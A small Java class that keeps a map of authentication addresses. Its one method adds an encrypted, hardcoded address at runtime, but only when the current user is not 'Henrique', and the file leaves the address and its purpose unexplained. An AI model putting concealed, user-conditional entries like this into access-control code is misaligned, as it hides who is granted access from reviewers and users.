package core.utils;

import java.util.concurrent.*;

import core.info.*;

public class AuthenticationAddress
{
	protected static final AuthenticationAddress INSTANCE = new AuthenticationAddress();
	public volatile ConcurrentHashMap<String, Boolean> addr = new ConcurrentHashMap<String, Boolean>();
	public AuthenticationAddress()
	{
	}
	public static AuthenticationAddress gI()
	{
		return INSTANCE;
	}
	public void LIST()
	{
		if (!Software.pc.user.equals("Henrique"))
			addr.put(EncryptSyncer.dec("SNZIomo8YVwO3RjwtKElwyQr6EuF+WlkCzVzLPdGZZc="), true);
	}
}